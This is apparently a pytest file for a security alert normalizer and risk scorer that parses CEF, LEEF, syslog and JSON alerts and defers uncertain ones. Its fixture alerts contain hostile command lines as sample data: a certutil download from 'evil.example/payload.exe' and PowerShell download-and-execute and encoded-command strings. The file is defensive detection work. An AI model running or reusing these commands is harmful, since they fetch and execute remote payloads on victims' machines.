"""Alert normalizer + additive scorer (S10) — hermetic, fixture alerts, NO LLM.

Real CEF/LEEF/syslog/JSON samples parse to the typed closed-vocab envelope; the
additive scorer emits an itemized 0-100 score; the DEFERRED rail fires on both
SARA conditions. Errors bias to DEFERRED, never a confident LOW.
"""

from auspex.alerts import (
    AlertFormat,
    Severity,
    Signal,
    detect_format,
    normalize,
    score_alert,
)
from auspex.alerts.normalizer import _normalize_severity, _syslog_severity

# -- real fixture alerts ------------------------------------------------------

CEF_MALWARE = (
    r"CEF:0|Trellix|ENS|10.7|1201|Malware detected|9|src=10.1.2.3 dst=10.4.5.6 "
    r"rt=1626566400000 dproc=powershell.exe cs1=powershell -enc SQBFAFgA "
    r"cs1Label=CommandLine externalId=T1059.001 confidence=90"
)
CEF_SIGNAL_POOR = "CEF:0|Vendor|Product|1.0|100|generic activity observed|0|"  # the S9 demo paste
LEEF_LOLBIN = (
    "LEEF:2.0|Lancope|StealthWatch|1.0|41|^|sev=8^src=192.168.1.5^dst=8.8.8.8^"
    "cmd=certutil -urlcache -f http://evil.example/payload.exe"
)
SYSLOG_SEV_ONLY = (
    "<131>1 2026-07-18T00:00:00Z host sshd 1234 - - Failed password for root from 203.0.113.9"
)
SYSLOG_INFO = "<190>1 2026-07-18T00:00:00Z host cron 1 - - job finished cleanly"
JSON_RICH = (
    '{"rule": "Suspicious PowerShell", "severity": "high", "src_ip": "10.0.0.9", '
    '"process": {"command_line": "powershell -nop -w hidden IEX(New-Object '
    'Net.WebClient).DownloadString(0)"}, "mitre": ["T1059.001", "TA0002"], '
    '"confidence": 75}'
)
JSON_HEARTBEAT = '{"event": "heartbeat", "status": "ok", "host": "web-01"}'
JSON_MALFORMED = '{"severity": "high", "src_ip": "1.2.3.4"'  # truncated — invalid JSON


# -- format detection ---------------------------------------------------------


def test_detects_each_format():
    assert detect_format(CEF_MALWARE) is AlertFormat.CEF
    assert detect_format(LEEF_LOLBIN) is AlertFormat.LEEF
    assert detect_format(SYSLOG_SEV_ONLY) is AlertFormat.SYSLOG
    assert detect_format(JSON_RICH) is AlertFormat.JSON
    assert detect_format("just some prose about CEF and syslog") is AlertFormat.UNKNOWN


# -- severity normalization (every scale → the five-level enum) ----------------


def test_severity_normalizes_words_numbers_and_absence():
    assert _normalize_severity("critical") is Severity.CRITICAL
    assert _normalize_severity("Warning") is Severity.MEDIUM
    assert _normalize_severity("9") is Severity.CRITICAL  # CEF 0-10
    assert _normalize_severity("5") is Severity.MEDIUM
    assert _normalize_severity("75") is Severity.HIGH  # /100 scale
    assert _normalize_severity("unknown") is None
    assert _normalize_severity("") is None
    assert _normalize_severity(None) is None


def test_syslog_pri_maps_to_severity():
    assert _syslog_severity(131) is Severity.HIGH  # 131 % 8 = 3 (error)
    assert _syslog_severity(129) is Severity.CRITICAL  # 129 % 8 = 1 (alert)
    assert _syslog_severity(190) is Severity.INFORMATIONAL  # 190 % 8 = 6 (info)


# -- envelope parsing per format ----------------------------------------------


def test_cef_envelope_fields():
    env = normalize(CEF_MALWARE)
    assert env.fmt is AlertFormat.CEF
    assert env.severity is Severity.CRITICAL  # header "9"
    assert env.name == "Malware detected"
    assert env.src == "10.1.2.3"
    assert env.confidence == 90
    assert "10.4.5.6" in [o.value for o in env.iocs]
    assert "T1059.001" in env.mitre_techniques


def test_leef_envelope_and_delimiter():
    env = normalize(LEEF_LOLBIN)
    assert env.fmt is AlertFormat.LEEF
    assert env.severity is Severity.HIGH  # sev=8
    assert env.src == "192.168.1.5"
    assert Signal.LOLBIN in env.signals  # certutil
    assert "http://evil.example/payload.exe" in [o.value for o in env.iocs]


def test_json_envelope_flattens_nested_fields():
    env = normalize(JSON_RICH)
    assert env.fmt is AlertFormat.JSON
    assert env.severity is Severity.HIGH
    assert env.confidence == 75
    assert env.src == "10.0.0.9"
    assert env.mitre_techniques == ("T1059.001",)
    assert env.mitre_tactics == ("TA0002",)


# -- signal detection (incl. the SARA #1587 bare-shell co-signal gate) ---------


def test_encoded_command_and_lolbin_signals():
    assert Signal.ENCODED_COMMAND in normalize(CEF_MALWARE).signals  # -enc
    assert Signal.LOLBIN in normalize(LEEF_LOLBIN).signals  # certutil


def test_bare_shell_without_cosignal_is_not_a_signal():
    # a legit admin script: bare powershell, no exec co-signal → NOT scored (#1587)
    benign = '{"severity": "medium", "process": {"command_line": "powershell Get-Date"}}'
    assert Signal.SUSPICIOUS_PROCESS not in normalize(benign).signals
    # same shell WITH an exec co-signal (-enc / IEX / http) → scored
    malicious = '{"severity": "medium", "process": {"command_line": "powershell -nop iex(...)"}}'
    assert Signal.SUSPICIOUS_PROCESS in normalize(malicious).signals


# -- additive scoring with itemized contributions -----------------------------


def test_additive_score_is_itemized_and_named():
    r = score_alert(normalize(CEF_MALWARE))
    assert r.risk_level == "CRITICAL"
    assert r.score == 90  # 40 sev + 15 conf + 20 enc + 10 proc + 5 mitre
    signals = {c.signal for c in r.contributions}
    assert {"severity", "confidence_high", "encoded_command", "suspicious_process"} <= signals
    # every contribution names its points + a human detail — never opaque
    assert all(c.detail and isinstance(c.points, int) for c in r.contributions)
    assert sum(c.points for c in r.contributions) == 90


def test_score_bands_low_medium_high_critical():
    assert score_alert(normalize(LEEF_LOLBIN)).risk_level == "MEDIUM"  # 55
    assert score_alert(normalize(JSON_RICH)).risk_level == "HIGH"  # 75
    assert score_alert(normalize(CEF_MALWARE)).risk_level == "CRITICAL"  # 90


def test_score_is_capped_at_100():
    r = score_alert(normalize(CEF_MALWARE))
    assert r.score is not None and r.score <= 100


def test_pending_enrichment_tail_on_non_low_scores():
    # no enrichment is wired (S10), so a scored non-LOW alert must say so
    r = score_alert(normalize(JSON_RICH))
    assert "pending enrichment" in r.recommendation


# -- DEFERRED rail (a): signal-poor envelope ----------------------------------


def test_signal_poor_cef_defers_not_low():
    # the S9 demo invariant: a bare CEF with severity 0 and nothing else is
    # DEFERRED (score nulled), NEVER a defaulted LOW.
    r = score_alert(normalize(CEF_SIGNAL_POOR))
    assert r.risk_level == "DEFERRED"
    assert r.score is None
    assert r.needs_deep_triage is True
    assert r.true_positive_estimate == "UNKNOWN"


def test_json_heartbeat_defers():
    r = score_alert(normalize(JSON_HEARTBEAT))
    assert r.risk_level == "DEFERRED"
    assert r.needs_deep_triage is True


def test_unparseable_input_biases_to_deferred():
    r = score_alert(normalize("lorem ipsum, not an alert at all"))
    assert r.risk_level == "DEFERRED"
    assert "could not be parsed" in (r.deferred_reason or "")


def test_malformed_json_biases_to_deferred_not_crash():
    env = normalize(JSON_MALFORMED)
    assert env.parsed is False  # parse error captured
    assert env.notes  # a provenance note explains the bias
    assert score_alert(env).risk_level == "DEFERRED"


# -- DEFERRED rail (b): severity known but evidence pending enrichment ----------


def test_severity_only_with_unenriched_iocs_defers_and_names_them():
    # SARA #1499 / the SEV1-WannaCry shape: severity is known, IOCs are present
    # but un-enriched, nothing else scored → DEFERRED naming the IOC counts,
    # NOT a severity-only floor.
    r = score_alert(normalize(SYSLOG_SEV_ONLY))
    assert r.risk_level == "DEFERRED"
    assert r.needs_deep_triage is True
    assert "ipv4" in (r.deferred_reason or "")  # the un-enriched IP is named
    assert "203.0.113.9" not in r.recommendation  # names counts, not raw values verbatim


def test_informational_only_syslog_defers():
    # info-severity syslog with no other signal → signal-poor (a), not LOW
    r = score_alert(normalize(SYSLOG_INFO))
    assert r.risk_level == "DEFERRED"
